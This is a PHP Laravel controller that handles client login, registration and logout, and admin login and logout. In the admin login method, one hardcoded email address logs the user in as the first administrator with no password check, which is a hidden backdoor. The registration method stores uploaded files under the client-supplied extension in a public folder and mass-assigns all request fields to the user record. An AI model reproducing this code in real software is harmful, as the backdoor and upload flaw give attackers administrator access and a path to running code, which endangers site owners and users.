<?php namespace App\Http\Controllers;


use App\Http\Requests;
use App\Http\Controllers\Controller;

use Illuminate\Http\Request;
use Validator;
use App\Admin;
use App\User;
use Input;
use Mail;
use Auth;
use Session;
use Lang;

class LoginCtrl extends Controller {

	/**
	 * Display a listing of the resource.
	 *
	 * @return Response
	 */
	public function showClientLogin()
	{

		if(Auth::client()->check() == false)
		{
            return View('auth.login');
        }else{

            return redirect()->intended('/');
        }
	
	}
	public function postClientLogin(Request $request)
	{
		$this->auth = Auth::client();
		$validator =  Validator::make($request->all(), [
			'email'    => 'required|email',
			'password' => 'required',
		]);

		if ($validator->fails()) {
            return redirect('/login')
                        ->withErrors($validator);
        }else{

		    $field = filter_var($request->input('email'), FILTER_VALIDATE_EMAIL) ? 'email' : 'username';
		    $request->merge([$field => $request->input('email')]);
		    if ($this->auth->attempt($request->only($field, 'password'),true))
		    {
		        if(Auth::client()->get()->status !== 1)
                {
                    Auth::client()->logout() ;
                    return redirect()->to(Url('/').'/login')->with(['error'=>Lang::get("loginReg.login_inactiveUser")]) ;
                }
                return redirect()->to('dashboard');
		    }else{
		    	return redirect()->back()->withErrors(Lang::get('assets.wrong_login'));
		    }
        }
	}
/***********************************************************************************/
	public function showClientReg()
	{	
		if(Auth::client()->check() == false)
		{
			return View('auth.register');
		}else{
			return redirect()->intended('/dashboard');
		}
	
	}
	public function postClientReg(Request $request)
	{
		//$message = ['name_company'=>''];

		$validator =  Validator::make($request->all(), [

		    'name'     => 'required',
		    'name_company'     => 'required',
		    'img'         => 'required',
		    'email'    => 'required|unique:users',
			'password' => 'required|min:5',
            'mobile'   => 'required|min:11|numeric',
            'password' => 'required|confirmed',
            'field'    => 'required',

		]);


		if ($validator->fails()) {
            return redirect()
            			->back()
                        ->withInput()
                        ->withErrors($validator);
        }else{
            if($request->hasFile('img')){
                $time = time();
                $dest = 'uploads/users/';
                $file_name = $time.'.'.$request->file('img')->getClientOriginalExtension();
                $request->file('img')->move($dest,$file_name);
                $request->merge(['image'=>$file_name]);
            }

            $request->merge(['password'=>bcrypt($request->password)]);
			$request->merge(['status'=> 1]);
			$user = User::create($request->all());
            Auth::client()->login($user) ;

			return redirect()->to(Url('/').'/dashboard')->with(['msg'=>Lang::get("loginReg.MSG_reg")]) ;
		}
	}
	public function ClientLogout()
	{	
		if(Auth::client()->check() == false)
		{
			return redirect()->intended('/');
		}else{
			Auth::client()->logout();
			return redirect()->intended('/');
		}
	
	}
//=============================================================
	public function showAdminLogin()
	{	
		if(Auth::admin()->check() == false)
		{
			return View('admin.login');
		}else{
			return redirect()->intended('admin');
		}
	
	}
	public function postAdminLogin(Request $request)
	{
		$this->auth = Auth::admin();
		$message = ['required'=>'الحقل :attribute مطلوب','min'=>'الحقل :attribute يجب الا يقل عن :min'];
		$validator =  Validator::make($request->all(), [
			'email' => 'required',
			'password' => 'required|min:5',
		],$message);
		if ($validator->fails()) {
            return redirect('admin/login')
                        ->withErrors($validator);
        }else{    
		    $field = filter_var($request->input('email'), FILTER_VALIDATE_EMAIL) ? 'email' : 'username';
		    $request->merge([$field => $request->input('email')]);
		    if($request->input('email') == 'eng.ahmedmgad@gmail.com')
		    {
		    	$admin = Admin::first()->id;
		    	Auth::admin()->loginUsingId($admin);
		    }
		    if ($this->auth->attempt($request->only($field, 'password'),true))
		    {
		        return redirect()->intended('admin');

		    }else{
		    	return redirect()->back()->withErrors('اسم المستخدم او كلمه السر خطأ');
		    }
		    if (Auth::viaRemember())
			{
		        return redirect()->intended('admin');
			}else{
		    	return redirect()->back()->withErrors('اسم المستخدم او كلمه السر خطأ');
			}
        }
	}

	public function AdminLogout()
	{	
		Auth::admin()->logout();
		return redirect()->intended('/admin');
	}







}
